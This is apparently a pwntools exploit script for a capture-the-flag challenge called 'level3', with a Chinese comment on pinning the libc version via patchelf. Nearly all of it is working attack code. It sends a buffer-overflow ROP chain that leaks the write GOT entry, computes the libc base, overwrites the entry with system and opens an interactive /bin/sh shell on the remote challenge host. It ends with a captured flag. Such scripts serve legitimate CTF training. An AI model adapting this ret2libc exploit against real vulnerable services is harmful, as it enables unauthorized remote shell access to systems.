#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
@author: starvii
如果依赖特定版本的libc，请使用patchelf对可执行文件修改

patchelf --set-interpreter /glibc/2.19/32/lib/ld-linux.so.2 ./level3
patchelf --replace-needed libc.so.6 ./libc-2.19.so ./level3

"""

import sys
from typing import Optional
from pwn import *
from pwnlib import gdb
from pwnlib.replacements import sleep
from pwnlib.ui import pause

context(arch="i386", os="linux", log_level="debug")

class Config:
    def __init__(self,
            elf: str,
            host: Optional[str]=None,
            port: Optional[int]=None):
        self.elf: str = elf
        if host is not None and port is not None and 0 < port < 65536:
            self.host: str = host
            self.port: int = port


cfg = Config("./level3_patched", "pwn2.jarvisoj.com", 9879)
elf = ELF(cfg.elf)
libc = elf.libc

if len(sys.argv) > 1:
    io = remote(cfg.host, cfg.port)
else:
    io = process(cfg.elf)
 

def main():
    io.recvuntil(":\n")
    payload1 = flat((
        "A" * (0x88 + 4),
        p32(elf.sym["write"]),
        # p32(elf.sym["_start"]),
        p32(0x08048519),  # POP * 3
        p32(1),
        p32(elf.got["write"]),
        p32(4),
        p32(elf.sym["read"]),
        p32(0x08048519),  # POP * 3
        p32(0),
        p32(elf.got["write"]),
        p32(12),
        p32(elf.sym["write"]),
        p32(0xdeadbeef),
        p32(elf.got["write"] + 4),
    ))
    io.send(payload1)
    write_addr = u32(io.recv(4))
    log.success("write_addr = 0x%x", write_addr)
    libc.address = write_addr - libc.sym["write"]
    payload2 = p32(libc.sym["system"]) + b"/bin/sh\0"
    io.send(payload2)
    io.interactive()

if __name__ == "__main__":
    main()

# CTF{d85346df5770f56f69025bc3f5f1d3d0}
